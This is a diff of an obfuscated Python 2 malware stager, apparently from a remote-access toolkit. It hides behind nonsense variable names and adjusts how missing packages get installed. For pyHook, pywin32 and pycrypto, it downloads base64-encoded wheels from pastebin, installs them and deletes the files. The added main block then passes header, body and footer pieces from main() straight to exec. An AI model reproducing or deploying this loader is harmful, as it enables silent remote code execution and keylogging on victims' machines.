@@ -107,32 +107,35 @@ def main(*args, **kwargs):
                     if not len(RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'show', FoamyNonstopHistory])):
                         RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', FoamyNonstopHistory])
                         if not len(RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'show', FoamyNonstopHistory])):
-                            if 'pyHook' in FoamyNonstopHistory and 'pastebin' in NobleRusticWalrus:
-                                ZonkedEnthusiasticTadpole = 'pyHook-1.5.1-cp27-cp27m-win_amd64.whl'
-                                with file(ZonkedEnthusiasticTadpole, 'wb') as fp:
-                                    fp.write(base64.b64decode(urllib.urlopen(NobleRusticWalrus).read()))
-                                RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', ZonkedEnthusiasticTadpole])
-                                if os.path.isfile(ZonkedEnthusiasticTadpole):
-                                    os.remove(ZonkedEnthusiasticTadpole)
-                            elif 'pypiwin32' in FoamyNonstopHistory and 'pastebin' in NobleRusticWalrus:
-                                ZonkedEnthusiasticTadpole = 'pywin32-221-cp27-cp27m-win_amd64.whl'
-                                with file(ZonkedEnthusiasticTadpole, 'wb') as fp:
-                                    fp.write(base64.b64decode(urllib.urlopen(NobleRusticWalrus).read()))
-                                RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', ZonkedEnthusiasticTadpole])
-                                SilkyPerilousManifesto  = os.path.join(sys.prefix, os.path.join('Scripts', 'pywin32_postinstall.py'))
-                                if os.path.isfile(SilkyPerilousManifesto):
-                                    RuthlessSpiffyTablecloth([SilkyPerilousManifesto, '-install'])
-                                if os.path.isfile(ZonkedEnthusiasticTadpole):
-                                    os.remove(ZonkedEnthusiasticTadpole)
-                            elif 'pycrypto' in FoamyNonstopHistory and 'pastebin' in NobleRusticWalrus:
-                                ZonkedEnthusiasticTadpole = 'pycrypto-2.6.1-cp27-none-win_amd64.whl'
-                                with file(ZonkedEnthusiasticTadpole, 'wb') as fp:
-                                    fp.write(base64.b64decode(urllib.urlopen(NobleRusticWalrus).read()))
-                                RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', ZonkedEnthusiasticTadpole])
-                                if os.path.isfile(ZonkedEnthusiasticTadpole):
-                                    os.remove(ZonkedEnthusiasticTadpole)
-                            else:
+                            if 'pastebin' not in NobleRusticWalrus:
                                 RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', NobleRusticWalrus])
+                            else:
+                                if 'pyHook' in FoamyNonstopHistory:
+                                    ZonkedEnthusiasticTadpole = 'pyHook-1.5.1-cp27-cp27m-win_amd64.whl'
+                                    with file(ZonkedEnthusiasticTadpole, 'wb') as fp:
+                                        fp.write(base64.b64decode(urllib.urlopen(NobleRusticWalrus).read()))
+                                    RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', ZonkedEnthusiasticTadpole])
+                                    if os.path.isfile(ZonkedEnthusiasticTadpole):
+                                        os.remove(ZonkedEnthusiasticTadpole)
+                                elif 'pypiwin32' in FoamyNonstopHistory:
+                                    ZonkedEnthusiasticTadpole = 'pywin32-221-cp27-cp27m-win_amd64.whl'
+                                    with file(ZonkedEnthusiasticTadpole, 'wb') as fp:
+                                        fp.write(base64.b64decode(urllib.urlopen(NobleRusticWalrus).read()))
+                                    RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', ZonkedEnthusiasticTadpole])
+                                    SilkyPerilousManifesto  = os.path.join(sys.prefix, os.path.join('Scripts', 'pywin32_postinstall.py'))
+                                    if os.path.isfile(SilkyPerilousManifesto):
+                                        RuthlessSpiffyTablecloth([SilkyPerilousManifesto, '-install'])
+                                    if os.path.isfile(ZonkedEnthusiasticTadpole):
+                                        os.remove(ZonkedEnthusiasticTadpole)
+                                elif 'pycrypto' in FoamyNonstopHistory:
+                                    ZonkedEnthusiasticTadpole = 'pycrypto-2.6.1-cp27-none-win_amd64.whl'
+                                    with file(ZonkedEnthusiasticTadpole, 'wb') as fp:
+                                        fp.write(base64.b64decode(urllib.urlopen(NobleRusticWalrus).read()))
+                                    RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', ZonkedEnthusiasticTadpole])
+                                    if os.path.isfile(ZonkedEnthusiasticTadpole):
+                                        os.remove(ZonkedEnthusiasticTadpole)
+                                else:
+                                    SeamlessGalacticSponges('{"{}": "{}"} was not loaded'.format(ZonkedEnthusiasticTadpole, NobleRusticWalrus))
             except Exception as e:
                 if __DEBUG__:
                     print("Launch error: {}".format(str(e)))
@@ -165,4 +168,11 @@ def main(*args, **kwargs):
 
 
 if __name__ == '__main__':
-    m = main(config=81126388790932157784)
+    header, body, footer = main(config=81126388790932157784)
+    if __DEBUG__:
+        try:
+            print("\nHeader:\n{}\n".format(bytes(header)))
+            print("\nBody:\n{}\n".format(bytes(body)))
+            print("\nFooter:\n{}\n".format(bytes(footer)))
+        except: pass
+    exec "\n\n\n".join([header, body, footer])
